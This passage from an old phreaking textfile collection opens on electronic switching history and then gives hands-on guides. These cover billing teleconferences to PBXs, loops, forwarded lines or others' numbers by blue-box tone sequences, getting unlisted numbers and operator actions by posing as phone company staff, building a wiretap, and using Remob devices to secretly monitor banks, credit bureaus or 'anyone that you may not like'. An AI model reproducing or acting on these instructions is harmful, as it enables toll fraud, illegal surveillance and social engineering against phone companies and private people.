good speed, mass production methods must be developed; but, at
the same time, there can be no loss of precision..." Another year
and millions of dollars later, on May 30, 1965, the first
commercial electric centeral office was put into service at
Succasunna, New Jersey.

   Even at Succasunna, only 200 of the town's 4,300 subscribers
initially had the benefit of electronic switching's added speed
and additional services, such as provision for three party
conversations and automatic transfer of incoming calls. But after
that, ESS was on its way. In January 1966, the second commercial
installation, this one serving 2,900 telephones, went into
service in Chase, Maryland. By the end of 1967 there were
additional ESS offices in California, Connecticut, Minnesota,
Georgia, New York, Florida, and Pennsylvania; by the end of 1970
there were 120 offices serving 1.8 million customers; and by 1974
there were 475 offices serving 5.6 million customers.

   The difference between conventional switching and electronic
switching is the difference between "hardware" and "software"; in
the former case, maintenence is done on the spot, with
screwdriver and pliers, while in the case of electronic
switching, it can be done remotely, by computer, from a centeral
point, making it possible to have only one or two technicians on
duty at a time at each switching center. The development program,
when the final figures were added up, was found to have required
a staggering four thousand man-years of work at Bell Labs and to
have cost not $45 million but $500 million!



Unlisted Phone Numbers                          by The Jolly Roger

There are a couple of different ways of doing this. Let's see if 
this one will help: Every city has one or more offices dedicated 
to assigning numbers to the telephone wire pairs. These offices 
are called DPAC offices and are available to service reps who are 
installing or repairing phones. To get the DPAC number, a service 
rep would call the customer service number for billing information 
in the town that the number is located in that he is trying to get 
the unlisted number of. (Got that?) The conversation would go 
something like this: "Hi, Amarillo, this is Joe from Anytown 
business office, I need the DPAC number for the south side of 
town." This info is usually passed out with no problems, so... if 
the first person you call doesn't have it, try another. REMEMBER, 
no one has ANY IDEA who the hell you are when you are talking on 
the phone, so you can be anyone you damn well please! (heheheheh!) 
When you call the DPAC number, just tell them that you need a 
listing for either the address that you have, or the name. DPAC 
DOES NOT SHOW WHETHER THE NUMBER IS LISTED OR UNLISTED!! Also, if 
you're going to make a habit of chasing numbers down, you might 
want to check into geting a criss-cross directory, which lists 
phone numbers by their addresses. It costs a couple-a-hundred bux, 
but it is well worth it if you have to chase more than one or two 
numbers down!

				RFLAGGBasic Alliance Teleconferencing                 Courtesy of the Jolly Roger

Introduction:
------------
This phile will deal with accessing, understanding and using the Alliance
Teleconferencing Systems.... it has many sections and for best use should
be printed out...enjoy...

Alliance:
--------
Alliance Teleconferencing is an independant company which allows the general
public to access and use it's conferencing equipment.  Many rumors have
been floating apound that Alliance is a subsidary of AT&T.
Well, they are wrong.  As stated above, Alliance is an entirely independant
company.  They use sophisticated equipment to allow users to talk to many
people at once.

The Number:
---------
Alliance is in the 700 exchange, thus it is not localized, well, not
in a way.  Alliance is only in certain states, and only
residents of these certain states can access by dialing direct.  This,
however, will be discussed in a later chapter.  The numbers for alliance are
as follows:
     0-700-456-1000 (chicago)
              -1001 (los angeles)
              -1002 (chicago)
              -1003 (houston)
              -2000 (?)
              -2001 (?)
              -2002 (?)
              -2003 (?)
              -3000 (?)
              -3001 (?)
              -3002 (?)
              -3003 (?)

The locations of the first 4 numbers are known and i have stated them.
However, the numbers in the 200x and 300x are not definately known.
Rumor has it that the pattern repeats itself but this has not been proven.

Dialing:
-------
As stated before, Alliance is only in certain stated and only these states
can access them via dialing direct.  However, dialing direct causes your
residence to be charged for the conference and conference bills are not low!!!
Therefore, many ways have been discovered to start a conference without
having it billed to ones house.  They are as follows:
     
     1) Dialing through a PBX
     2) Incorporating a Blue Box
     3) Billing to a loop
     4) Billing to a forwarded call

I am sure there are many more but these are the four i will deal with.

Dialing through a PBX:
------- ------- - ---
Probably the easiest method of creating a free conference is through a PBX.
Simply call one in a state that has Alliance, input the PBX's code,
dial 9 for an outside line and then dial alliance.
An example of this would be:

PBX: 800-241-4911

When it answers it will give you a tone.  At this tone input your code.

Code: 1234

After this you will receive another tone, now dial 9 for an outside line. 
You will now hear a dial tone.  Simply dial Alliance from this point and
the conference will be billed to the PBX.

Using a Blue Box:
----- - ---- ---
Another rather simple way of starting a conference is with a Blue Box.
The following procedure is how to box a conference:
Dial a number to box off of.  In this example we will use 609-609-6099
When the party answers hit 2600hz.  This will cause the fone company's
equipment to think that you have hung up.  You will hear a <beep><kerchunk>
You have now 'seized' a trunk.  After this, switch to multi-frequency
and dial:

KP-0-700-456-x00x-ST
KP=KP tone on Blue Box
x=variable between 1 and 3
ST=ST tone on Blue Box
The equipment now thinks that the operator has dialed Alliance from her
switchboard and the conference shall be billed there.  Since Blue Boxing
is such a large topic, this is as far as I will go into it's uses.

Billing to a loop:
------- -- - ----
A third method of receiving a free conference is by billing out to a
loop.  A loop is 2 numbers that when two people call, they can talk
to each other.  You're saying woop-tee-do right? Wrong! Loops can be
<very> usefull to phreaks.  First, dial alliance direct.  After going
through the beginning procedure, which will be discussed later in this
tutorial, dial 0 and wait for an Alliance operator.  When she answers
tell her you would like to bill the conference to such and such a
number. (A loop where your phriend is on the other side) She will then
call that number to receive voice verification.
Of course your phriend will be waiting and will accept the charges.
Thus, the conference is billed to the loop.

Billing to call forwarding:
------- -- ---- ----------
When you dial a number that is call forwarded, it is first answered by
the original location, then forwarded.  The original location will
hang up if 2600hz is received from only ond end of the line.
Therefore, if you were to wait after the forwarded residence answered,
you would receive the original location's dial tone.
    
     Example:
Dial 800-325-4067
The original residence would answer, then forward the call, a second 
type of ringing would be heard.  When this second residence answers
simply wait until they hang up.  After about twenty seconds you will
then receive the original residence's dial tone since it heard 2600hz
from one end of the line.  Simply dial Alliance from this point and the
conference will be billed to the original residence.
These are the four main ways to receive a free conference.  I am sure
many more exist, but these four are quite handy themselves.

Logon Procedure:
----- ---------
Once Alliance answers you will hear a two-tone combination.  This is their
way of saying 'How many people do you want on the conference dude?'
Simply type in a 2-digit combination, depending on what bridge of Alliance
you are on, between 10 and 59.  After this either hit '*' to cancel the
conference size and inout another or hit '#' to continue.
You are now in Alliance Teleconferencing and are only seconds away from
having your own roaring conference going strong!!!

Dialing in Conferees:
------- -- ---------
To dial your first conferee, dial 1+npa+pre+suff and await his/her answer.

npa=area code
pre=prefix
suff=suffix

If the number is busy, or if no one answers simply hit '*' and your call
will be aborted.  But, if they do answer, hit the '#' key.
This will add them to the conference.
Now commence dialing other conferees.

Joining Your Conference:
------- ---- ----------
To join your conference from control mode simply hit the '#' key. 
Within a second or two you will be chatting with all your buddies.
To go back into control mode, simply hit the '#' key again.

Transferring Control:
------------ -------
To transfer control to another conferee, go into control mode, hit the
# 6+1+npa+pre+suff of the conferee you wish to give control to. If after,
you wish to abort this transfer hit the '*' key.

<note>:Transfer of control is often not available.  When you
receive a message stating this, you simply cannot transfer control.

Muted Conferences:
----- -----------
To request a muted conference simply hit the 9 key.  I am not exactly
sure what a muted conference is but it is probably a way to keep unwanted
eavesdroppers from listening in.

Dialing Alliance Operators:
------- -------- ---------
Simply dial 0 as you would from any fone and wait for the operator to answer.

Ending Your Conference:
------ ---- ----------
To end your conference all together, that is kick everyone including
yourself off, go into control mode and hit '*'...after a few seconds
simply hang up.  Your conference is over.

Are Alliance Operators Dangerous?
--- -------- --------- ---------
No.  Not in the least.  The worst they can do to you while you are having
a conference is drop all conferees including yourself.  This is in no 
way harmful, just a little aggravating.

Alliance and Tracing:
-------- --- -------
Alliance can trace, as all citizens of the United States can. 
But this has to all be pre-meditated and AT&T has to be called and it's
really a large hastle, therefore, it is almost never done.  Alliance simply
does not want it known that teenagers are phucking them over. 
The only sort of safety equipment Alliance has on-line is a simple pen
register.  This little device simply records all the numbers of the
conferees dialed.  No big deal.  All Alliance can do is call up that persons
number, threaten and question.  However, legally, they can do nothing because
all you did was answer your fone.

<note>:Almost all instructions are told to the person in command by Alliance
recordings.  A lot of this tutorial is just a listing of those
commands plus information gathered by either myself or the phellow
phreaks of the world!!!

        (Originally an Apple ][ file, forgive the upper case!)

THIS METHOD OF STARTING THE CONF. DEPENDS ON YOUR ABILITY TO BULLSHIT THE
OPERATOR INTO DIALING A NUMBER WHICH CAN ONLY BE REACHED WITH AN OPERATOR'S
M-F TONES.  WHEN BULLSHITTING THE OPERATOR REMEMBER OPERATOR'S ARE NOT
HIRED TO THINK BUT TO DO.

HERE IS A STEP-BY-STEP WAY TO THE CONF.:
1. CALL THE OPERATOR THROUGH A PBX OR EXTENDER, YOU COULD JUST CALL ONE
THROUGH YOUR LINE BUT I WOULDN'T RECOMMEND IT.
2. SAY TO THE OPERATOR:
TSPS MAINTENENCE ENGINEER, RING-FORWARD TO 213+080+1100, POSITION RELEASE,
THANKYOU.
(SHE WILL PROBABLY ASK YOU FOR THE NUMBER AGAIN)

DEFINITIONS: RING-FORWARD - INSTRUCTS HER TO DIAL THE NUMBER.
POSITION RELEASE - INSTUCTS HER TO RELEASE THE TRUNK AFTER SHE HAS
DIALED THE NUMBER.
+ - REMBER TO SAY 213PLUS080 PLUS1100.
3. WHEN YOU ARE CONNECTED WITH THE CONF. YOU WILL HERE A WHISTLE BLOW
TWICE AND A RECORDING ASKING YOU FOR YOUR OPERATOR #. DIAL IN ANY FIVE
DIGITS AND HIT THE POUNDS SIGN A COUPLE OF TIMES. SIMPLY DIAL IN THE #
OF THE BILLING LINE ECT. WHEN THE RECORDING ASK FOR IT.
3. WHEN IN THE CONTROL MODE OF THE CONF. HIT '6' TO TRANSFER CONTROL.
HIT '001' TO REENTER THE # OF CONFEREE'S AND TIME AMOUNT WHICH YOU
GAVE WHEN YOU STARED THE CONF. REMEMBER THE SIZE CAN BE FROM
2-59 CONFEREE'S. I HAVE NOT FOUND OUT THE 'LENGTHS' LIMITS.




HOW TO START YOUR OWN CONFERENCES!      Brought to you by Exodus

BLACK BART SHOWED HOW TO START A CONFERENCE CALL THRU AN 800 EXCHANGE, AND I
WILL NOW EXPLAIN HOW TO START A CONFERENCE CALL IN A MORE ORTHODOX FASHIO, THE
2600 HZ. TONE.

FIRSTLY, THE FONE COMPANY HAS WHAT IS CALLED SWITCHING SYSTEMS.  THERE ARE SE
VERAL TYPES, BUT THE ONE WE WILL CONCERN OURSELVES WITH, IS ESS (ELECTRONIC
SWITCHING SYSTEM).  IF YOUR AREA IS ZONED FOR ESS, DO NOT START A CONFERENCE
CALL VIA THE 2600 HZ. TONE, OR BELL SECURITY WILL NAIL YOUR ASS!  TO FND OUT IF
YOU ARE UNDER ESS, CALL YOUR LOCAL BUSINESS OFFICE, AND ASK THEM IF YOU CAN GET
CALL WAITING/FORWARDING, AND IF YOU CAN, THAT MEANS THAT YOU ARE IN ESS COUNTRY
, AND CONFERENCE CALLING IS VERY, VERY DANGEROUS!!! NOW, IF YOU ARE NOT IN ESS,
YOU WILL NEED THE FOLLOWING EQUIPMENT:

  AN APPLE CAT II MODEM
  A COPY OF TSPS 2 OR CAT'S MEOW
  A TOUCH TONE FONE LINE
  AND A TOUCH TONE FONE. (TRUE TONE)

NOW, WITH TSPS 2, DO THE FOLLOWING:

 RUN TSPS 2
 CHOSE OPTION 1
 CHOSE OPTION 6
 CHOSE SUB-OPTION 9

  NOW TYPE:

 1-514-555-1212 (DASHES ARE NOT NEEDED)

LISTEN WITH YOUR HANDSET, AND AS SOON AS YOU HEAR A LOUD 'CLICK', THEN TYPE

 $

TO GENERATE THE 2600 HZ. TONE.  THIS OBNOXIOUS TONE WILL CONTINUE FOR A FEW
SECONDS, THEN LISTEN AGAIN AND YOU SHOULD HEAR ANOTHER LOUD 'CLICK'.

 NOW TYPE:

 KM2130801050S

WHERE 'K' = KP TONE
      'M' = MULTI FREQUENCY MODE
      'S' = S TONE

NOW LISTEN TO THE HANDSET AGAIN, AND WAIT UNTIL YOU HEAR THE 'CLICK' AGAIN.
THEN TYPE:

  KM2139752975S

WHERE 2139751975 IS THE NUMBER TO BILL THE CONFERENCE CALL TO. NOTE: 213-975-
1975 IS A DISCONNECTED NUMBER, AND I STRONGLY ADVISE THAT YOU ONLY BILL THE
CALL TO THIS NUMBER, OR THE FONE COMPANY WILL FIND OUT, AND THEN..........
REMEBER, CONFERENCE CALLS ARE ITEMIZED, SO IF YOU DO BILL IT TO AN ENEMY'S NUMB
ER, HE CAN EASILY FIND OUT WHO DID IT AND HE CAN BUST YOU!

YOU SHOULD NOW HEAR 3 BEEPS, AND A SHORT PRE-RECORDED MESSAGE.  FROM HERE ON,
EVERYTHING IS ALL MENU DRIVEN.

 CONFERENCE CALL COMMANDS
 ---------- ---- --------

   FROM THE '#' MODE:

     1 = CALL A NUMBER
     6 = TRANSFER CONTROL
     7 = HANGS UP THE CONFERENCE CALL
     9 = WILL CALL A CONFERENCE OPERATR

STAY AWAY FROM 7 AND 9!  IF FOR SOME REASON AN OPERATOR GETS ON-LINE,
HANG UP! IF YOU GET A BUSY SIGNAL AFTER KM2130801050S, THAT MEANS THAT THE
TELECONFEREN CING LINE IS TEMPORARILY DOWN.  TRY LATER, PREFERRABLY FROM 9AM TO
5PM WEEK DAYS, SINCE CONFERENCE CALLS ARE PRIMARILY DESIGNED FOR BUSINESS

Phone Taps                                      by The Jolly Roger

Here is some info on phone taps. In this file is a schematic for a 
simple wiretap & instructions for hooking up a small tape recorder 
control relay to the phone line.

First, I will discuss taps a little. There are many different 
types of taps. there are transmitters, wired taps, and induction 
taps to name a few. Wired and wireless transmitters must be 
physically connected to the line before they will do any good. 
Once a wireless tap is connected to the line,it can transmit all 
conversations over a limited reception range. The phones in the 
house can even be modifies to pick up conversations in the room 
and transmit them too! These taps are usually powered off of the 
phone line, but can have an external power source. You can get more
information on these taps by getting an issue of Popular
Communications and reading through the ads. Wired taps, on the 
other hand, need no power source, but a wire must be run from the 
line to the listener or to a transmitter. There are obvious 
advantages of wireless taps over wired ones. There is one type of
wireless tap that looks like a normal telephone mike. All you have 
to do is replace the original mike with thisand itwill transmit 
all conversations! There is also an exotic type of wired tap known 
as the 'Infinity Transmitter' or 'Harmonica Bug'. In order to hook 
one of these, it must be installed inside the phone. When someone 
calls the tapped phone & *before* it rings,blows a whistle over 
the line, the transmitter picks up the phone via a relay. The mike 
on the phone is activated so that the caller can hear all of the 
conversations in the room. There is a sweep tone test at     
415/BUG-1111 which can be used to detect one of these taps. If one 
of these is on your line & the test # sends the correct tone, you 
will hear a click. Induction taps have one big advantage over taps 
that must be physically wired to the phone. They do not have to be 
touching the phone in order to pick up the conversation. They work 
on the same principle as the little suction-cup tape recorder 
mikes that you can get at Radio Shack. Induction mikes can be 
hooked up to a transmitter or be wired.

Here is an example of industrial espionage using the phone:
 A salesman walks into an office & makes a phone call. He fakes 
the conversation, but when he hangs up he slips some foam rubber 
cubes into the cradle. The called party can still hear all 
conversations in the room. When someone picks up the phone, the 
cubes fall away unnoticed.
 
A tap can also be used on a phone to overhear what your modem is 
doing when you are wardialing, hacking, or just plain calling a 
bbs (like the White Ruins! Denver, Colorado! 55 megs online! 
Atari! Macintosh! Amiga! Ibm! CALL IT! 303-972-8566! By the way, i 
did this ad without the sysops consent or knowledge!). 

Here is the schematic:
-------)!----)!(------------->
             )!(
  Cap ^      )!(
             )!(

     ^^^^^---)!(------------->
       ^  100K
       !
       ! <Input

The 100K pot is used for volume. It should be on its highest 
(least resistance) setting if you hook a speaker across the 
output. but it should be set on its highest resistance for a tape 
recorder or amplifier. You may find it necessary to add another
10 - 40K. The capacitor should be around .47 MFD. It's only 
purpose is to prevent the relay in the phone from tripping & 
thinking that you have the phone off of the hook. the audio output 
transformer is available at Radio Shack. (part # 273-138E for 
input). The red & the white wires go to the output device. You may 
want to experiment with the transformer for the best output. 
Hooking up a tape recorder relay is easy. Just hook one of the phone 
wires (usually red) to the the end of one of the relay & the ther 
end just loop around. This bypasses it. It should look like this:

------^^^^^^^^^------------
      ---------
      RELAY^^
(part #275-004 from Radio Shack works fine)

If you think that you line is tapped, the first thing to do is to 
physically inspect the line yourself ESPECIALLY the phones. You 
can get mike replacements with bug detectors built in. However, I 
would not trust them too much. It is too easy to get a wrong 
reading.

The Phreaker's Guide to Loop Lines          courtesy of the Jolly Roger

    A loop is a wonderous device which the telephone company created as test
numbers for telephone repairmen when testing equipment.  By matching the
tone of the equipment with the tone of the loop, repairmen can adjust and test
the settings of their telephone equipment.
    A loop, basically, consists of two different telephone numbers.  Let's
use A and B as an example.  Normally if you call A, you will hear a loud
tone (this is a 1004 hz tone), and if you call B, the line will connect, and
will be followed by silence.
    This is the format of a loop line. Now, if somebody calls A and someone
else calls B--Viola!--A and B loop together, and one connection is made.
Ma Bell did this so repairmen can communicate with each other without
having to call their own repair office. They can also use them to exchange
programs, like for ANA or Ringback. Also, many CO's have a "Loop Assignment
Center".  If anyone has any information on these centers please tell me.
    Anyway, that is how a loop is constructed.  From this information,
anyone can find an actual loop line. Going back to the A and B example,
Note: the tone side and the silent side can be either A or B.  Don't be fooled
if the phone company decides to scramble them around to be cute.
   As you now know, loops come in pairs of numbers.  Usually, right after each
other.
 For example: 817-972-1890
                 and
              817-972-1891
   Or, to save space, one loop line can be written as 817-972-1890/1.
   This is not always true.  Sometimes, the pattern is in the tens or hundreds,
and, occaisionally, the numbers are random.
   In cities, usually the phone company has set aside a phone number suffix
that loops will be used for.  Many different prefixes will correspond
with that one suffix.
   In Arlington, Texas, a popular suffix for loops is 1893 and 1894, and
a lot of prefixes match with them to make the number.
 For Example:  817-460-1893/4
               817-461-1893/4
               817-465-1893/4
               817-467-1893/4
               817-469-1893/4
        ...are all loops...
   or a shorter way to write this is:
              817-xxx-1893/4
      xxx= 460, 461, 465, 467, 469
   Note: You can mix-and-match a popular suffix with other prefixs in a
city, and almost always find other loops or test numbers.
   Note: For Houston, the loop suffixes are 1499 and 1799.  And for Detroit
it's 9996 and 9997.
   When there are a large number of loops with the same prefix format,
chances are that many loops will be inter-locked.  Using the above example
of Arlington loops again, (I will write the prefixes to save space) 460, 461,
and 469 are interlocked loops.  This means that only one side can be used at
a given time.  This is because they are all on the same circuit. 
   To clarify, if 817-461-1893 is called, 817-460 and 469-1893 cannot be
called because that circuit is being used.  Essentialy, interlocked loops
are all the same line, but there are a variety of telephone numbers to access
the line.
   Also, if the operator is asked to break in on a busy loop line he/she
will say that the circuit is overloaded, or something along those
lines.  This is because Ma Bell has taken the checking equipment off
the line.  However, there are still many rarely used loops which can
be verfied and can  have emergency calls taken on them.
   As you have found out, loops come in many types.  Another type of loop is a
filtered loop.  These are loop lines that the tel co has put a filter on, so
that normal human voices cannot be heard on either line.  However, other
frequencies may be heard.  It all depends on what the tel co wants the
loop to be used for. If a loop has gotten to be very popular with the
local population or used frequently for conferences, etc. the tel co may filter
the loop to stop the unwanted "traffic".  Usually, the filter will be
removed after a few months, though.

Computer Based PBX                     Courtesy of the Jolly Roger
    (Originally an Apple ][ file for forgive the upper case!)

TO GET A BETTER UNDERSTANDING OF WHAT A PBX CAN DO, HERE ARE A FEW BASIC
FUNDAMENTALS.THE MODERN PBX IS A COMBINED COMPUTER,MASS STORAGE DEVICE,
AND OF COURSE A SWITCHING SYSTEM THAT CAN:
      [1] PRODUCE ITEMIZED,AUTOMATED BILLING PROCEDURES,TO ALLOW THE
          IDENTIFICATION AND MANAGEMENT OF TOLL CALLS. [HAHAHA]
      [2] COMBINE DAYTIME VOICE GRADE COMMUNICATION CIRCUITS INTO
          WIDEBAND DATA CHANNELS FOR NIGHT TIME HIGH SPEED DATA
          TRANSFERS.
      [3] HANDLES ELECTRONIC MAIL [ INCLUDING OFFICE MEMOS ].
      [4] COMBINE VOICE CHANNELS INTO A WIDEBAND AUDIO/VISUAL
          CONFERENCE CIRCUIT,WITH THE ABILITY TO XFER AND
          CAPTURE SLIDES,FLIPCHARTS,PICTURES OF ANY KIND.
BOTH THE EXTERNAL AND INTERNAL CALLING CAPACITY OF THE PBX SYSTEM MUST BE
CAREFULLY CONSIDERED BECAUSE MANY BUSINESS OPERATIONS RUN A VERY HIGH RATIO
OF INTERNAL STATION TO STATION DIALING AND A LOW CAPACITY SYSTEM WILL NOT
HANDLE THE REQUESTED TRAFFIC LOAD.
A CRITICAL FACTOR IS THE NUMBER OF TRUNKS AND THE CENTRAL OFFICE FACILITIES
THAT ARE USED FOR OUTSIDE CONNECTIONS.ANOTHER IS THE NUMBER OF JUNCTIONS OR
[LINKS] THAT MAKE UP THE INTERNAL CALLING PATHS.
TO UNDERSTAND THE SERVICES AVAILABLE ON A TYPICAL COMPUTER RUN PBX IT IS
NECESSARY TO INTRODUCE THE SUBJECT OF TIME DIVISION SWITCHING.IN A TIME
DIVISION SWITCHING NETWORK ALL CONNECTIONS ARE MADE VIA A SINGLE COMMON BUS
CALLED (OF COURSE) A 'TIME-DIVISION BUS'.EVERY LINE TRUNK THAT REQUIRES A
CONNECTION WITH ANOTHER IS PROVIDED WITH A PORT CIRCUIT.ALL PORT CIRCUITS
HAVE ACCESS TO THE TIME DIVISION BUS THROUGH A TIME DIVISION SWITCH.
[WHEN TWO PORTS REQUKRE CONNECTION,THEIR TIME DIVISION SWITCHES OPERATE AT
A VERY HIGH FREQUENCY (16,000 TIMES PER SECOND).THIS TECHNIQUE,WHICH IS
CALLED 'SPEECH SAMPLING',ALLOWS MANY SIMULTANEOUS CONNECTIONS OVER THE SAME
TIME DIVKSION BUS.EACH CONNECTION IS ASSIGNED A TIME INTERVAL,THE 'TIME SLOT'
,AND THE NUMBER OF TIME SLOTS IDENTIFIES THE NUMBER OF SIMULTANEOUS CONNECT-
IONS AMONG PORTS.]
THE NEXT CRITICAL ITEM IS CIRCUIT PACKS.THE SYSTEM ELEMENTS THAT WE WILL BE
DESCRIBING IN FUTURE TUTORIALS [LINES/TRUNKS/SWITCHES,MEMORY AND CONTROL] ARE
CONTAINED ON PLUG IN CIRCUIT PACKS.EACH LINE CIRCUIT PACK CONTAINS A NUMBER
OF LINES,IN EXAMPLE,FOUR.BUT THE ASSIGNMENT OF STATION NUMBERS TO ACTUAL
PHONE LINE CIRCUITS IS FLEXIBLE.
THE SYSTEM MEMORY IS CONTAINED IN CIRCUIT PACKS WHICH PROVIDE THE CALL
PROCESSING FUNCTIONS.THE CIRCUIT PACKS ARE HELD IN SMALL FRAMES CALLED
'CARRIERS'.WITHIN EACH CARRIER,THE CIRCUIT PACKS ARE PLUGGED INTO POSITIONS:
THE 'SLOTS'.EVERY CIRCUIT CAN BE ADDRESSED BY,SAY A FIVE DIGIT NUMBER WHICH
TELLS ITS LOCATION BY CARRIER-SLOT-CIRCUIT.... [STARTING TO GET THE IDEA?]
THERE CAN BE THREE TYPES OF CARRIERS IN A MODERN PBX SYSTEM:
                O LINE CARRIERS
                O TRUNK CARRIERS
                O CONTROL CARRIERS
THE LINE CARRIERS CONTAIN STATION LINES.IN A.T.& T.'S "DIMENSION" MODEL,FOR
EXAMPLE,A TOTAL OF 52 TO 64 LINES ARE PROVIDED.THE TRUNK CARRIERS CONTAIN
SLOTS FOR 16 TRUNK CIRCUIT PACKS.THE CONTROL CARRIER INCLUDES PROCESSOR,
MEMORY,CONTROL CIRCUITRY,DATA CHANNELS FOR ATTENDANT CONSOLE CONTROL AND
TRAFFIC MEASUREMENT OUTPUTS.
PBX SYSTEMS WILL DIRECTLY REFLECT THE TYPES OF SERVICES OFFERED AT THE C.O.
           O CCSA
           O CCIS
           O PICTUREPHONES [SOONER THAN YOU THINK MY PHRIENDS]
COMMON CONTROL SWITCHING ARRANGEMENTS ( CCSA ) PERMIT ANY UNRESTRICTED TELE-
PHONE STATION TO CALL ANY OTHET INTERNAL OR EXTERNAL SYSTEM STATION BY USING
THE STANDARD SEVEN DIGIT NUMBER.ALTERNATE ROUTING IS A FEATURE OF CCSA SERVICE
THE INTERFACILITY,ALTERNATE ROUTED CALLING PATHS ARE ACCOMPLISHED AT THE TELE-
PHONE COMPANY CENTRAL OFFICE LEVEL,NOT AT THE PBX LEVEL.
A SYSTEM OF INTEREST TO LARGE SCALE TELEPHONE USERS IS COMMON CHANNEL INTER-
OFFICE SIGNALLING (CCIS).TYPICALLY,THIS TECHNIQUE EMPLOYS COMMON CHANNELS TO
CARRY ALL INTERFACILITY SIGNALLING INSTRUCTIONS: DIAL PULSES,ON HOOK (IDLE),
OFF HOOK (BUSY),AND SO ON,BETWEEN TWO SWITCHING CENTERS. [ GETTING WARM ].
CCIS REPLACES OLDER METHODS OF INTEROFFICE SIGNALLING SUCH AS 'IN BAND' AND
'OUT OF BAND' TECHNIQUES. BY THE WAY,REAL PHREAKS ARE SELLING THEIR BOXES TO
IDIOTS WHO STILL THINK THE'RE WORTH ALOT...THE FORMER (IN BAND) TRANSMITS
SIGNALLING DATA WITHIN THE NORMAL CONVERSATION BANDWIDTH.IT'S SHORTCOMING IS
THAT FALSE INFORMATION MAY BE TRANSMITTED DUE TO UNIQUE TONE OR NOISE
COMBINATIONS SET UP IN THE TALKING PATH. [THIS IS THE OFFICIAL REASONING].
OUT OF BAND SIGNALLING TECHNIQUES PLACED THE INTEROFFICE DATA IN SPECIAL
CHANNELS,GENERALLY ADJACENT TO AND IMMEDIATELY ABOVE THE VOICE PATH.TO PRE-
SERVE INTERCHANNEL INTEGRITY,OUT OF BAND SIGNALLING REQUIRES VERY EFFECIENT
FILTERING OR GREATER 'BAND GUARD' SEPERATION BETWEEN CHANNELS.

[__RemObS_________________________]             by the Jolly Roger

Some of you may have heard of devices called Remobs which stands
for Remote Observation System. These Devices allow supposedly
authorized telephone employees to dial into them from anywhere, and
then using an ordinary touch tone fone, tap into a customer's line
in a special receive only mode. [The mouthpiece circuit is
deactivated, allowing totally silent observation from any
fone in the world (Wire tapping without a court order is against
the law)]

[__How Remobs Work______________]
Dial the number of a Remob unit.  Bell is rumored to put them in the
555 information exchanges, oron special access trunks 
[Unreachable except via blue box].  A tone will then be heard
for approximately 2 seconds and then silence.  You must key in
(In DTMF) a 2 to 5 digit access code while holding each digit down
at least 1 second.  If the code is not entered within 5 or 6 seconds,
the Remob will release and must be dialed again.  If the code is
supposedly another tone will be heard.  A seven digit subscriber
fone number can then be entered [The Remob can only handle certain
'exchanges' which are prewired, so usually one machine cannot
monitor an entire NPA].  The Remob will then connect to the
subscribers line.  The listener will hear the low level idle tone
as long as the monitored party is on hook.  As the monitored party
dials [rotary or DTMF], the listener would hear [And Record]
the number being dialed.  Then the ENTIRE conversation, datalink,
whatever is taking place,  all without detection.  There is no
current box which can detect Remob observation, since it is being done
with the telephone equipment that makes the connection.  When the
listener is finished monitoring of that particular customer,  he keys
the last digit of the access code to disconnects him from the
monitored line and return to the tone so that he can key in another
7 digit fone #.  When the listener is totally finished with the Remob,
he keys a single 'disconnect digit' which disconnects him from the
Remob so that the device can reset and be ready for another caller.

[_History of Remobs_______________]
     Bell has kept the existance of Remobs very low key.  Only in
1974, Bell acknowledged that Remobs existed.  The device was
first made public during hearings on "Telephone Monitoring Practices
by Federal Agencies" before a subcommittee on government
operations.  House of Representatives, Ninety-Third Congress, June
1974. 
It has since been stated by Bell that the Remob devices
are used exclusively for monitoring Bell employees such as operators,
information operators, etc., to keep tabs on their performance.
[Suuureee, were stupid]

[__Possible Uses for Remobs__]
     The possible uses of Remobs are almost as endless as the uses
of self created fone line.  Imagine the ability to monitor bank lines
etc, just off the top of my head I can think of these applications:

     Data Monitoring of:
TRW
National Credit Bureau
AT&T Cosmos
Bank Institutions
Compuserve and other Networks.
     Voice Monitoring of:
Bank Institutions
Mail Order buisnesses.
Bell Telephone themselves.
Any place handling sensitive or important information.
Anyone that you may not like.

     With just one Remob, someone could get hundreds of credit cards,
find out who was on vacation, get compuserve passwords by the dozens,
disconnect peoples fones, do credit checks, find out about anything
that they may want to find out about.  Im sure you brilliant
can see the value of a telephone hobbiest and a telecommunications
enthusist getting his hands on a few choice Remobs. <Grin>

[_Caution________________________]
   If any reader should discover a Remob during his (or her) scanning
excursions,  please keep in mind the very strict federal laws
regarding wiretapping and unauthorized use of private Bell property.

Bell Trashing                                   by the Jolly Roger

     The Phone Co. will go to extreams on occasions. In fact, unless
you really know what to expect from them, they will suprise the heck
out of you with their "unpublished tarriffs". Recently, a situation
was brought to my attention that up till then I had been totaly
unaware of, least to mention, had any concern about. It involved gar-
bage! The phone co. will go as far as to prosecute anyone who rumages
through their garbage and helps himself to some
     Of course, they have their reasons for this, and no doubt benefit
from such action. But, why should they be so picky about garbage? The
answer soon became clear to me: those huge metal bins are filled up
with more than waste old food and refuse... Although it is Pacific
Tele. policy to recycle paper waste products, sometimes employees do
overlook this sacred operation when sorting the garbage.  Thus
top-secret confidential Phone Co. records go to the garbage bins
instead of the paper shredders. Since it is constantly being updated
with "company memorandums, and supplied with extensive reference
material, the Phone co. must continualy dispose of the outdated
materials. Some phone companies are supplied each year with the
complete "System Practices" guide. This publication is an over 40
foot long library of reference material about everything to do with
telephones. As the new edition arrives each year, the old version of
"System Practices" must also be thrown out.
    I very quickly figured out where some local phone phreaks were
getting their material. They crawl into the garbage bins and remove
selected items that are of particular interest to them and their
fellow phreaks. One phone phreak in the Los Angeles area has salvaged
the complete 1972 edition of "Bell System Practices". It is so large
and was out of order (the binders had been removed) that it took him
over a year to sort it out and create enough shelving for it in his
garage.
     Much of this "Top Secret" information is so secret that most phone
companies have no idea what is in their files. They have their hands
full simply replacing everything each time a change in wording
requires a new revision. It seems they waste more paper than they can
read!
     It took quite a while for Hollywood Cal traffic manager to figure
out how all of the local phone phreaks constantly discovered the
switchroom test numbers
     Whenever someone wanted to use the testboard, they found the local
phone phreaks on the lines talking to all points all over the world.
It got to the point where the local garbage buffs knew more about the
office operations than the employees themselves. One phreak went so
far as to call in and tell a switchman what his next daily assignment
would be. This, however, proved to be too much. The switchman
traced the call and one phone phreak was denied the tool of his trade.
     In another rather humorous incident, a fellow phreak was rumaging
through the trash bin when he heard somone apraoching. He pressed up
against the side of the bin and silently waited for the goodies to
come. You can imagine his surprise when the garbage from the lunchroom
landed on his head. Most people find evenings best for checking out
their local telco trash piles. The only thing necessary is a
flashlight and, in the case mentioned above, possibly a rain coat. A
word of warning though, before you rush out and dive into the trash
heap. It is probably illegal, but no matter where you live, you
